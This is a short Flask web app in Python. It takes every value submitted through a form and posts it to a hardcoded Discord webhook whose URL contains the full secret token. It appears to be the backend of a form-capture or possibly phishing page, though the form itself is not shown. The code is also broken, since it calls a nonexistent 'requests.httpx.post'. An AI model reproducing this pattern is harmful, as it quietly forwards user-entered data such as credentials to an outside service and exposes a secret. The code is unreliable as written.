from flask import Flask, request, render_template
import json
import requests
app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def hello_world():
    if request.method == 'POST':
        a = request.form
        for item, value in a.items():
            print(f"{item}: {value}")
            requests.httpx.post("https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM", data={"content": f"{value}"})
    
    return render_template('base.html')

